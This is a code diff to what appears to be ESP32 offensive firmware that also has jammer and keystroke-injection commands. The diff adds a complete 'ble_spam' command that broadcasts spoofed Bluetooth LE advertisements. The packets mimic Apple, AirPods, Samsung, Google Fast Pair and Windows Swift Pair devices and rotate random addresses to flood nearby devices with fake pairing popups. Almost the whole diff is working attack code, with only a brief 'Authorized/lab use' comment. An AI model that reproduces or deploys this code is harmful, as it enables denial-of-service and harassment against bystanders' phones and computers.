@@ -2286,6 +2286,7 @@ static void bt_format_addr(const uint8_t *addr, char *str);
 static int bt_start_scan(void);
 static int bt_start_scan_coex(void);
 static void bt_stop_scan(void);
+static void ble_spam_stop(void);
 static int wigle_wifi_channel_to_frequency_mhz(int channel);
 static double gps_distance_meters(double lat1, double lon1, double lat2, double lon2);
 static bool wardrive_trace_init_file(const char *path);
@@ -11675,6 +11676,7 @@ static int cmd_stop(int argc, char **argv) {
     // Stop nRF24 jammer if running
     nrf24_jammer_stop();
     nrf24_apps_stop();
+    ble_spam_stop();
 
     // Stop 802.15.4 recon if running
     if (zig_recon_is_active() || current_radio_mode == RADIO_MODE_IEEE802154) {
@@ -21707,6 +21709,132 @@ static int cmd_nrf_mj_inject(int argc, char **argv) {
     return 0;
 }
 
+/* ---- BLE advertising spam (native NimBLE): Apple/Samsung/Google/Windows ----
+ * Ported from nRFBox / ESP32-DIV / esp32-rf-sword SourApple & BLE-popup spam.
+ * These reference tools all transmit BLE popups with the ESP's own BLE radio
+ * (NOT the nRF24), so this uses the NimBLE host JanOS already runs. Broadcasts
+ * crafted non-connectable, non-scannable adv PDUs, rotating a random static
+ * address + payload each burst. Emits [BLE_SPAM_*] tokens. Authorized/lab use. */
+typedef enum { SPAM_APPLE = 0, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_WINDOWS, SPAM_ALL } ble_spam_type_t;
+static volatile bool s_spam_stop = true;
+static volatile bool s_spam_running = false;
+static ble_spam_type_t s_spam_type = SPAM_APPLE;
+static TaskHandle_t s_spam_task = NULL;
+static volatile int s_spam_count = 0;
+
+static int spam_build_apple(uint8_t *o) {
+    static const uint8_t acts[] = {0x27,0x09,0x02,0x1e,0x2b,0x2d,0x2f,0x01,0x06,0x20,0xc0};
+    o[0]=0x10; o[1]=0xff; o[2]=0x4c; o[3]=0x00; o[4]=0x0f; o[5]=0x05; o[6]=0xc1;
+    o[7]=acts[esp_random() % sizeof(acts)];
+    o[8]=esp_random(); o[9]=esp_random(); o[10]=esp_random();
+    o[11]=0x00; o[12]=0x00; o[13]=0x10;
+    o[14]=esp_random(); o[15]=esp_random(); o[16]=esp_random();
+    return 17;
+}
+static int spam_build_apple_airpods(uint8_t *o) {
+    static const uint8_t models[] = {0x02,0x0e,0x0a,0x0f,0x13,0x14,0x03,0x0b,0x0c,0x11,0x10,0x05,0x06,0x09,0x17,0x12,0x16};
+    static const uint8_t tmpl[31] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x00,0x20,0x75,0xaa,0x30,0x01,
+                                     0x00,0x00,0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0,0};
+    memcpy(o, tmpl, 31);
+    o[7]=models[esp_random() % sizeof(models)];
+    o[13]=esp_random(); o[14]=esp_random(); o[15]=esp_random();
+    return 31;
+}
+static int spam_build_samsung(uint8_t *o) {
+    static const uint8_t model[] = {0x01,0x02,0x03};
+    static const uint8_t t[15] = {0x0e,0xff,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xff,0x00,0x00,0x43,0x00};
+    memcpy(o, t, 15);
+    o[14]=model[esp_random() % sizeof(model)];
+    return 15;
+}
+static int spam_build_google(uint8_t *o) {
+    static const uint8_t t[14] = {0x03,0x03,0x2c,0xfe,0x06,0x16,0x2c,0xfe,0x00,0xb7,0x27,0x02,0x0a,0x00};
+    memcpy(o, t, 14);
+    o[13]=(uint8_t)(esp_random() % 121);   /* random tx power byte */
+    return 14;
+}
+static int spam_build_windows(uint8_t *o) {
+    static const uint8_t t[13] = {0x0c,0xff,0x06,0x00,0x03,0x00,0x80,'E','S','P','-','P','C'};
+    memcpy(o, t, 13);
+    return 13;
+}
+
+static void ble_spam_task(void *pv) {
+    (void)pv;
+    s_spam_running = true;
+    uint8_t buf[31];
+    struct ble_gap_adv_params advp;
+    int iter = 0;
+    while (!s_spam_stop) {
+        ble_gap_adv_stop();
+        uint8_t addr[6];
+        for (int i = 0; i < 6; i++) addr[i] = (uint8_t)esp_random();
+        addr[5] |= 0xC0;                       /* static random */
+        ble_hs_id_set_rnd(addr);
+        ble_spam_type_t t = s_spam_type;
+        if (t == SPAM_ALL) t = (ble_spam_type_t)(esp_random() % 4);
+        int len;
+        switch (t) {
+            case SPAM_SAMSUNG: len = spam_build_samsung(buf); break;
+            case SPAM_GOOGLE:  len = spam_build_google(buf); break;
+            case SPAM_WINDOWS: len = spam_build_windows(buf); break;
+            case SPAM_APPLE:
+            default:           len = (esp_random() & 1) ? spam_build_apple(buf) : spam_build_apple_airpods(buf); break;
+        }
+        ble_gap_adv_set_data(buf, len);
+        memset(&advp, 0, sizeof(advp));
+        advp.conn_mode = BLE_GAP_CONN_MODE_NON;   /* non-connectable broadcaster */
+        advp.disc_mode = BLE_GAP_DISC_MODE_NON;   /* raw data, no auto flags AD */
+        advp.itvl_min = 0x20; advp.itvl_max = 0x20;
+        ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &advp, NULL, NULL);
+        s_spam_count++;
+        if (++iter >= 25) { iter = 0; printf("[BLE_SPAM] sent=%d\n", s_spam_count); fflush(stdout); }
+        vTaskDelay(pdMS_TO_TICKS(40));
+    }
+    ble_gap_adv_stop();
+    printf("[BLE_SPAM_STOP] sent=%d\n", s_spam_count); fflush(stdout);
+    s_spam_running = false;
+    s_spam_task = NULL;
+    vTaskDelete(NULL);
+}
+
+static bool ble_spam_start(ble_spam_type_t t) {
+    if (bt_nimble_init() != ESP_OK) return false;
+    /* BLE scan and advertising can't both own the controller here; stop scan. */
+    bt_scan_active = false;
+    bt_stop_scan();
+    if (s_spam_running || s_spam_task != NULL) return false;
+    s_spam_type = t; s_spam_stop = false; s_spam_count = 0;
+    if (xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 4, &s_spam_task) != pdPASS) {
+        s_spam_task = NULL; s_spam_stop = true; return false;
+    }
+    return true;
+}
+static void ble_spam_stop(void) {
+    if (!s_spam_running && s_spam_task == NULL) return;
+    s_spam_stop = true;
+    for (int i = 0; i < 40 && s_spam_task != NULL; i++) vTaskDelay(pdMS_TO_TICKS(25));
+    if (s_spam_task != NULL) { vTaskDelete(s_spam_task); s_spam_task = NULL; s_spam_running = false; }
+    if (nimble_initialized) ble_gap_adv_stop();
+}
+
+static int cmd_ble_spam(int argc, char **argv) {
+    ble_spam_type_t t = SPAM_APPLE;
+    if (argc >= 2) {
+        if      (strcasecmp(argv[1], "apple")   == 0) t = SPAM_APPLE;
+        else if (strcasecmp(argv[1], "samsung") == 0) t = SPAM_SAMSUNG;
+        else if (strcasecmp(argv[1], "google")  == 0) t = SPAM_GOOGLE;
+        else if (strcasecmp(argv[1], "windows") == 0) t = SPAM_WINDOWS;
+        else if (strcasecmp(argv[1], "all")     == 0) t = SPAM_ALL;
+        else { printf("[BLE_SPAM] unknown type '%s' (apple|samsung|google|windows|all)\n", argv[1]); fflush(stdout); return 0; }
+    }
+    static const char *names[] = {"apple","samsung","google","windows","all"};
+    if (ble_spam_start(t)) printf("[BLE_SPAM_START] type=%s\n", names[t]);
+    else                   printf("[BLE_SPAM_ERR] start failed\n");
+    fflush(stdout);
+    return 0;
+}
+
 // --- Command registration in esp_console ---
 static void register_commands(void)
 {
@@ -22478,6 +22606,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&nrf_mj_inject_cmd));
+
+    const esp_console_cmd_t ble_spam_cmd = {
+        .command = "ble_spam",
+        .help = "BLE advertising spam: ble_spam [apple|samsung|google|windows|all]",
+        .hint = "[apple|samsung|google|windows|all]",
+        .func = &cmd_ble_spam,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&ble_spam_cmd));
 
     const esp_console_cmd_t wifi_connect_cmd = {
         .command = "wifi_connect",
